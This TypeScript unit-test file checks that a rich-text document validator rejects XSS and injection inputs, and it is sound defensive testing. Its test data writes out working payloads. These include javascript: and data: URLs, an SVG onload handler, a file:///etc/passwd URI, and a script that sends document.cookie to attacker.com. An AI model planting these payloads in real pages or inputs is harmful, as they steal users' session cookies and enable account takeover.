import { describe, it, expect } from "vitest";
import { isSafeUrl, validateDocumentContent } from "@/features/document/schemas/document-validator";
import { ValidationError } from "@/lib/api/errors";

describe("Document Content XSS & Injection Security Tests (Unit)", () => {
  describe("isSafeUrl protocol & sanitization checks", () => {
    it("should allow safe HTTP and HTTPS URLs", () => {
      expect(isSafeUrl("https://example.com")).toBe(true);
      expect(isSafeUrl("http://localhost:3000/docs")).toBe(true);
      expect(isSafeUrl("https://sub.domain.org/path?q=1#hash")).toBe(true);
    });

    it("should allow relative URLs and anchors", () => {
      expect(isSafeUrl("/workspaces/123/documents")).toBe(true);
      expect(isSafeUrl("./relative-link")).toBe(true);
      expect(isSafeUrl("#heading-1")).toBe(true);
    });

    it("should allow mailto: and tel: links", () => {
      expect(isSafeUrl("mailto:team@example.com")).toBe(true);
      expect(isSafeUrl("tel:+1234567890")).toBe(true);
    });

    it("should strictly reject javascript: pseudo-protocol in all variants", () => {
      expect(isSafeUrl("javascript:alert(1)")).toBe(false);
      expect(isSafeUrl("JavaScript:alert(document.cookie)")).toBe(false);
      expect(isSafeUrl("  javascript:void(0)  ")).toBe(false);
      expect(isSafeUrl("javascript://test%0Aalert(1)")).toBe(false);
      // Control char obfuscations
      expect(isSafeUrl("jav\u0000ascript:alert(1)")).toBe(false);
      expect(isSafeUrl("jav\tascript:alert(1)")).toBe(false);
    });

    it("should strictly reject data: URIs (preventing base64 HTML/SVG execution)", () => {
      expect(isSafeUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBe(false);
      expect(isSafeUrl("data:image/svg+xml,<svg onload=alert(1)>")).toBe(false);
    });

    it("should strictly reject vbscript: and file: URIs", () => {
      expect(isSafeUrl("vbscript:msgbox(1)")).toBe(false);
      expect(isSafeUrl("file:///etc/passwd")).toBe(false);
      expect(isSafeUrl("file://C:/Windows/System32/cmd.exe")).toBe(false);
    });
  });

  describe("validateDocumentContent AST & Mark Sanitization", () => {
    it("should accept valid ProseMirror AST documents", () => {
      const validDoc = {
        type: "doc",
        content: [
          {
            type: "heading",
            attrs: { level: 1 },
            content: [{ type: "text", text: "Security Architecture" }],
          },
          {
            type: "paragraph",
            content: [
              { type: "text", text: "Visit our " },
              {
                type: "text",
                text: "documentation",
                marks: [{ type: "link", attrs: { href: "https://example.com/docs" } }],
              },
            ],
          },
        ],
      };

      const result = validateDocumentContent(validDoc);
      expect(result).toEqual(validDoc);
    });

    it("should reject documents containing malicious link hrefs (XSS regression)", () => {
      const maliciousDoc = {
        type: "doc",
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "Click me",
                marks: [
                  {
                    type: "link",
                    attrs: { href: "javascript:alert(document.domain)" },
                  },
                ],
              },
            ],
          },
        ],
      };

      expect(() => validateDocumentContent(maliciousDoc)).toThrow(ValidationError);
      expect(() => validateDocumentContent(maliciousDoc)).toThrow(
        "Invalid or unsafe URL in link mark"
      );
    });

    it("should reject unsupported / injected malicious node types", () => {
      const injectedDoc = {
        type: "doc",
        content: [
          {
            type: "rawHtml",
            attrs: {
              html: "<script>window.location='http://attacker.com?c='+document.cookie</script>",
            },
          },
        ],
      };

      expect(() => validateDocumentContent(injectedDoc)).toThrow(ValidationError);
      expect(() => validateDocumentContent(injectedDoc)).toThrow("Unsupported node type 'rawHtml'");
    });

    it("should reject unsupported marks", () => {
      const maliciousMarkDoc = {
        type: "doc",
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "payload",
                marks: [{ type: "iframe", attrs: { src: "http://attacker.com" } }],
              },
            ],
          },
        ],
      };

      expect(() => validateDocumentContent(maliciousMarkDoc)).toThrow(ValidationError);
      expect(() => validateDocumentContent(maliciousMarkDoc)).toThrow(
        "Unsupported mark type 'iframe'"
      );
    });

    it("should reject deeply nested AST structures exceeding maximum depth limit (prevent stack overflow / DoS)", () => {
      // Construct 25 levels deep AST
      let current: any = { type: "paragraph", content: [{ type: "text", text: "Deep" }] };
      for (let i = 0; i < 25; i++) {
        current = { type: "listItem", content: [current] };
      }
      const deepDoc = {
        type: "doc",
        content: [current],
      };

      expect(() => validateDocumentContent(deepDoc)).toThrow(ValidationError);
      expect(() => validateDocumentContent(deepDoc)).toThrow(
        "Document exceeds maximum nesting depth"
      );
    });

    it("should reject text nodes exceeding maximum character length", () => {
      const oversizedTextDoc = {
        type: "doc",
        content: [
          {
            type: "paragraph",
            content: [{ type: "text", text: "a".repeat(50001) }],
          },
        ],
      };

      expect(() => validateDocumentContent(oversizedTextDoc)).toThrow(ValidationError);
      expect(() => validateDocumentContent(oversizedTextDoc)).toThrow("character limit");
    });
  });
});
